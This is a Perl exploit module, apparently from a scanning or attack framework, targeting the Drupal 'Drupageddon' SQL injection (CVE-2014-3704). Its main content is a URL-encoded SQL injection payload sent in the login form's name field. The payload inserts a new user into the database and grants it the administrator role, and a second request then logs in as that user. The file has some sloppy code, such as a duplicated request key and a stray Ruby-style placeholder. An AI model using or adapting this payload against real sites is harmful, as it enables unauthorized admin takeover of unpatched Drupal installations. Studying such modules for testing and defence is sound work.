package DRUPAL::MSF::DrupalDrupageddon;
use lib qw(../../); use parent qw(Exploit);

use 5.10.0;

use strict;
use warnings;

no warnings 'experimental';

use URI::URL;
use Data::Dump qw(dump);
use File::Slurp qw(read_file);

# # 
# # 
# # 

sub load {
    my $type  = shift;
    my $class = ref $type || $type;
    my $self = { };
    bless $self, $class;

    return $self;
}

sub new {
   my $class = shift;
   

   my $name = "DrupalDrupageddon";

   my $DETECTION = {

   };

my $EXPLOIT = {
  "#{USER}"     => "#{generate_password_hash(pass)",
  "CVE"         => "CVE-2014-3704",
  "DESCRIPTION" => "

        This module exploits the Drupal HTTP Parameter Key/Value SQL Injection

        (aka Drupageddon) in order to achieve a remote shell on the vulnerable

        instance. This module was tested against Drupal 7.0 and 7.31 (was fixed

        in 7.32).

      ",
  "METHOD"      => "GET",
  "MSF_MODULE"  => "drupal_drupageddon",
  "PATH"        => "q=user/login&q=user/login&q=user/login&q=admin/modules&q=admin/modules/list/confirm&q=admin/people/permissions&q=admin/people/permissions&q=node/add/article&",
  "PAYLOAD"     => "name=__NAME__&pass=__PASS__&form_build_id=__FORM_BUILD_ID__&form_id=user_login&op=Login&",
  "REFERENCES"  => [
                     "https://www.drupal.org/SA-CORE-2014-005",
                     "http://www.sektioneins.de/en/advisories/advisory-012014-drupal-pre-auth-sql-injection-vulnerability.html",
                   ],
  "TITLE"       => "Drupal HTTP Parameter Key/Value SQL Injection",
  VARIABLES => {
    'FORM_BUILD_ID' =>       { DESCRIPTION => "", VALUE => "" },
    'NAME' =>       { DESCRIPTION => "", VALUE => "" },
    'PASS' =>       { DESCRIPTION => "", VALUE => "" },
  },

  TYPE => 'MSF',
  PLATFORM => 'MULTI',
  REQUESTS => {
    EXPLOIT1 => {
      METHOD       => 'GET',
      PATH   => '',
      PAYLOAD      => '',
      TEXT   => 'Sending Exploit #1 Request : [GET] ',
      HEADERS      => {
        'Content-Type' => 'application/x-www-form-urlencoded',
      },
      VALIDATION   => {
        TCODE => ['200'],
      },
    },
    EXPLOIT1 => {
      METHOD       => 'POST',
      PATH   => '',
      PAYLOAD      => 'name%5b0%20%3binsert%20into%20users%20%28uid%2c%20name%2c%20pass%2c%20mail%2c%20status%29%20select%20max%28uid%29%2b1%2c%20%27tgrsxqjzjU%27%2c%20%27%24P\%248jBLEmBRwf.lV7FUOYDBPImXImHRN01%27%2c%20%27qazmq%40ifugw.gct%27%2c%201%20from%20users%3b%20insert%20into%20users_roles%20%28uid%2c%20rid%29%20VALUES%20%28%28select%20uid%20from%20users%20where%20name%3d%27tgrsxqjzjU%27%29%2c%20%28select%20rid%20from%20role%20where%20name%20%3d%20%27administrator%27%29%29%3b%20%23%20%5d=XWKIyYtQMM&name%5b0%5d=IFnRIlJHwY&pass=tHpmoYueqX&form_build_id=&form_id=user_login&op=Log%20in',
      TEXT   => 'Sending Exploit #1 Request : [POST] /',
      HEADERS      => {
        'Content-Type' => 'application/x-www-form-urlencoded',
      },
      VALIDATION   => {
        TCODE => ['200'],
      },
    },
    EXPLOIT2 => {
      METHOD       => 'POST',
      PATH   => '',
      PAYLOAD      => 'name=tgrsxqjzjU&pass=cXNwNMPuvP&form_build_id=&form_id=user_login&op=Log%20in',
      TEXT   => 'Sending Exploit #2 Request : [POST] /',
      HEADERS      => {
        'Content-Type' => 'application/x-www-form-urlencoded',
      },
      VALIDATION   => {
        TCODE => ['200'],
      },
    },
  },
   };

   return $class->SUPER::new($name, $DETECTION, $EXPLOIT, @_);
}

return 1;
